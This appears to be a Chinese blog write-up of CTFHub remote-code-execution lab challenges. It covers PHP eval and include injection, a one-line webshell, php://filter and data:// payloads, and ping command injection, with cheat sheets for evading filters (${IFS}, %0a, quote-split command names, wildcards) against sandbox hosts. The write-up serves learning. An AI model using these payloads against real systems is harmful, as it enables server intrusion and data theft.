---
title: 'rce学习笔记'
published: 2025-04-20
description: 'CTFHub-RCE WP'
tags: [Security]
category: note
draft: false
---

# RCE（远程代码执行）

攻击者利用漏洞，在**目标服务器 / 主机上直接执行任意代码**，属于高危漏洞。

核心原理：程序接收外部输入，没有做过滤、转义，把用户可控输入当成代码交给解释器执行。

> 输入 → 服务端当作代码执行 → 拿到服务器执行权限

常见场景：

1. **命令注入** ：后端直接拼接系统命令调用`system()`、`exec()`等。
2. **代码执行** ：后端函数，把外部传入字符串当作编程语言代码运行。 

```
// 代码执行 —— 执行 PHP 代码
eval()    assert()    call_user_func() include()

// 命令执行 —— 执行 Linux/Windows 命令
system()  exec()  passthru()  shell_exec()  popen()  `反引号`
```

主要危害：

- 读取服务器文件、下载源码
- 窃取数据库数据
- 上传木马、webshell
- 控制服务器，横向渗透内网
- 勒索、挖矿、删库

核心知识点：

 1. 命令连接符（Linux）：

    ```
    ;      顺序执行                 ls; cat flag
    &&     前面成功才执行后面       ls && cat flag
    ||     前面失败才执行后面       ls || cat flag
    |      管道，前面输出给后面     ls | cat
    &      并行执行                 ls & cat flag
    %0a    换行符（URL 编码后用）    —— 过滤了上面所有时的救命稻草
    ```

2. 读文件命令全家桶（cat 被禁就换）：

   ```
   cat tac nl more less head tail sort rev od xxd base64
   变形：c''at  ca""t  ca\t  ca$@t  c$1at   （插入空字符骗正则）
   通配符：cat f*   cat /fl?g   cat /f[a
   ```

3. 空格被过滤的替代品：

   ```
   ${IFS}    $IFS$9    {cat,flag}    <    <>    %09（Tab）
   ```

4. 斜杠 `/` 被过滤：进目录再读 —— `cd flag_is_here;cat *`

通用做题思路：

```
1. 看源码：F12 或题目直接给的源码，找 `preg_match` / 黑名单 —— 知道它过滤了什么
2. 找输入点：`?cmd=`、`?file=`、ping 框，判断是代码执行还是命令执行
3. 先探测再读取：先 `ls /` 或 `ls` 看 flag 文件名
4. 读 flag
5. 被过滤？ 查上面的替代表做变形
```



下面就开始打 RCE 的靶场了。本人是纯萌新，wp会写的比较详细，方便自己复习。

![image-20260924083647128](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924083647213.png)

## eval执行

![image-20260924051837246](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924051837293.png)

`eval($_REQUEST["cmd"]);`可以看到 cmd 参数直接被当代码执行，而且这题没过滤

先看下根目录下有什么：`http://challenge-31acfa6f741013a9.sandbox.ctfhub.com:10800/?cmd=system('ls /');`

![image-20260924053024407](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924053024467.png)

直接就找到了 flag 文件，读一下：`http://challenge-31acfa6f741013a9.sandbox.ctfhub.com:10800/?cmd=system('cat /flag_26114');`

![image-20260924053210632](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924053210686.png)

## 文件包含

![image-20260924053614203](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924053614260.png)

shell.txt 里是个一句话木马：`<?php eval($_REQUEST['ctfhub']);?>`

只要这个文件被 `include` 进主页面执行，`ctfhub` 参数（$_REQUEST = GET/POST 都行）里的内容就会被 `eval` 执行 。

`http://challenge-e8c9dd92249497e5.sandbox.ctfhub.com:10800/?file=shell.txt&ctfhub=system('ls /');`

![image-20260924055725420](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924055725463.png)

这次是直接叫 flag。我们可以看到 代码中的`!strpos()`这个过滤只检查 `file` 参数，而我们的命令在 `ctfhub` 参数里，所以 `cat /flag` 里的 flag 字样根本不拦 。

`http://challenge-e8c9dd92249497e5.sandbox.ctfhub.com:10800/?file=shell.txt&ctfhub=system('cat /flag');`

![image-20260924060145685](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924060145744.png)



### php://input

![image-20260924060850780](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924060850848.png)

这次只让用 `php://` 伪协议。

`php://`伪协议：本质是**PHP 内置的流封装协议**，不是网络层协议，是 PHP 提供的一套用 URL 格式字符串访问各类数据流的机制，可以被 `include / require / file_get_contents / fopen` 等文件函数解析处理。

常用的几个：

| 伪协议         | 干什么                               |
| -------------- | ------------------------------------ |
| `php://input`  | 读 POST 原文 → POST 里塞代码就能执行 |
| `php://filter` | 读文件，还能加工内容（base64 等）    |
| `data://`      | 数据直接写在 URL 里，含代码就能执行  |
| `http://`      | 去外网拉一个文件来包含               |

用 burp 发请求：

![d4198316-c224-4057-bf4c-9c0e062e0fc3](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924063648163.png)

![image-20260924063704773](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924063704862.png)

![90ecda52-ebd0-433f-b6ef-dfcd86eb8789](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924063951503.png)

![image-20260924063842118](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924063842147.png)



#### 读取源代码

![image-20260924064139930](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924064139989.png)

这道页面没有 **phpinfo 链接**了 ， `allow_url_include` 应该没开。所以这次 `php://input` 应该没用了

flag 位置也是直接说了，就在  /flag 里。

这次可以用`php://filter`。

```
php://filter /read=convert.base64-encode /resource=/flag
   ①协议名        ②对读出的内容做什么加工        ③读哪个文件
```

这次直接用 rot13 过滤器将 flag 原样输出就好了，不需要编码：`http://challenge-16866ff263c76bbb.sandbox.ctfhub.com:10800/?file=php://filter/read=convert.string.rot13/resource=/flag`

![image-20260924065955020](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924065955079.png)

实战里 filter 比 input 好用得多 —— 它不需要任何特殊配置，而且只读不执行，被限制得也少。

### 远程包含

![image-20260924071047979](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924071048020.png)

这次 include 没有伪协议的限制了，只拦了个 flag。但这次也没有本地木马可用。

看下phpinfo：`allow_url_include`  和 `allow_url_fopen` 都是 ON。所以这题可以用远程包含来做。

![300378bf-01dc-4a54-b9a3-47392bb00cb3](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924071358587.png)

远程包含（本题的名字）

file 填一个 `http://` 网址时，PHP 的执行过程：

1. 向该网址发送一个 HTTP 请求
2. 拿到响应内容
3. 把响应内容当作 PHP 代码执行

也就是说，可以把一段 PHP 代码放到**任何一个目标服务器能访问的网址**上（自己的 VPS、GitHub 等），然后 `?file=那个网址`。

data://（没有外部服务器时的替代）：

格式固定：`data://text/plain,内容`。include 处理它时，把逗号后面的内容当作“文件内容”。

所以 `file=data://text/plain,<?php system('ls /'); ?>` 的执行效果：include 拿到的文件内容就是 `<?php system('ls /'); ?>` 这段代码 → 执行它。等效于把代码直接写进了 URL 参数里，不需要任何外部网址。

![image-20260924072600942](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924072601003.png)

因为这道题对 file 过滤 "flag" 字符，所以不能写 `cat /flag`。用 `cat /f*` 来匹配。

![image-20260924073044393](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924073044456.png)

## 命令注入

![image-20260924073725292](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924073725347.png)

代码逻辑就是 我的输入会被直接拼到 `ping -c 4`后面执行 。但是我的输入这里是没有经过任何审查的。

和前面几道的区别：

|              | 前几题（代码执行/文件包含） | 这题（命令注入）                                |
| ------------ | --------------------------- | ----------------------------------------------- |
| 危险函数     | `eval()` / `include()`      | `exec()`（同类还有 system、shell_exec、反引号） |
| 执行的是什么 | PHP 代码                    | 操作系统命令（Linux shell 命令）                |
| payload 写法 | 要写 `<?php` / PHP 语法     | 直接写 Linux 命令                               |

直接输入 `127.0.0.1; ls /`

![a2c50107-8895-4044-b04f-8c2c5456cb8e](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924074655557.png)

没有看到 flag。换成`127.0.0.1; ls`试试：

![image-20260924074853785](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924074853820.png)

`17031117818784.php`就是 flag 文件。这关没过滤，下一步直接:`127.0.0.1; cat 17031117818784.php`

![image-20260924075207052](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924075207121.png)

没拿到 flag 。应该是文件中包含特殊字符，浏览器渲染的时候会吞掉。右键看下源代码：

![babf6bb0-6ad7-46b2-8871-194d5c89064b](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924075418874.png)

拿到 flag！

### 过滤cat

![image-20260924075616164](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924075616217.png)

前面一直用的 cat() 被过滤了。还好我准备了 读文件命令全家桶：

```
cat tac nl more less head tail sort rev od xxd base64
变形：c''at  ca""t  ca\t  ca$@t  c$1at   （插入空字符骗正则）
通配符：cat f*   cat /fl?g   cat /f[a
```

tac是反着输出（就是 cat 倒过来拼，多行文件会倒序打印）；nl    输出并带行号

more / less   分页显示；head / tail   看开头 / 结尾（head flag.php 默认前 10 行）

sort / rev    排序输出 / 每行反转；base64 文件   输出 base64，解码即原文

这里我用 nl 替换：`127.0.0.1; nl flag_1688896513994.php`。拿下！

![image-20260924080239918](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924080239979.png)



### 过滤空格

这次是过滤空格。我也提前准备了空格被过滤的替代品：

```
${IFS}    $IFS$9    {cat,flag}    <    <>    %09（Tab）
```

payload：`127.0.0.1;cat${IFS}flag_18772230631648.php`

![image-20260924081051123](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924081051200.png)

### 过滤目录分隔符

这次过滤目录分隔符`/`。那我们就不用这东西，每次进目录再读 。

`127.0.0.1; ls`

![image-20260924081558628](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924081558698.png)

`127.0.0.1;cd flag_is_here;ls`

![image-20260924081657366](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924081657442.png)

`127.0.0.1;cd flag_is_here;cat flag_240332740813207.php`

![image-20260924081904780](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924081904853.png)

### 过滤运算符

这次是过滤了运算符`|`、`&`。但我本来的习惯也是用`;`拼接。

payload：`127.0.0.1;cat flag_77902418520806.php`

![image-20260924082318895](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924082318968.png)

### 综合过滤练习

![image-20260924082523635](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924082523723.png)

这次过滤的多了：

| 被禁      | 影响                                 |
| --------- | ------------------------------------ |
| \|  和  & | 管道、与符号没了                     |
| `;`       | 分号也没了                           |
| `空格`    | `cat 文件` 中间的隔断没了            |
| `/`       | 完整路径写不了                       |
| `cat`     | 命令名被禁                           |
| `flag`    | flag 文件名含 flag，文件名都打不出来 |
| `ctfhub`  | 连 flag 内容的格式词都禁了           |

但其实每一项也都有出路：

| 被禁的             | 替代品                                                  |
| ------------------ | ------------------------------------------------------- |
| `;`                | `%0a`                                                   |
| 空格               | `${IFS}`                                                |
| `cat`              | `nl（或者 `ca''t` 变形）                                |
| `/` 和 flag 文件名 | `cd` 进目录 + 通配符 `f*`（f 开头匹配，避开 flag 字样） |

  `%0a`要编码，所以这次得在浏览器url里输 payload：

```text
http://challenge-32cca2204a93fe94.sandbox.ctfhub.com:10800/?ip=127.0.0.1%0acd${IFS}f*%0anl${IFS}f*
```

![image-20260924083550662](https://fastly.jsdelivr.net/gh/Stjorn/image_bed@main/images/20260924083550755.png)

收官！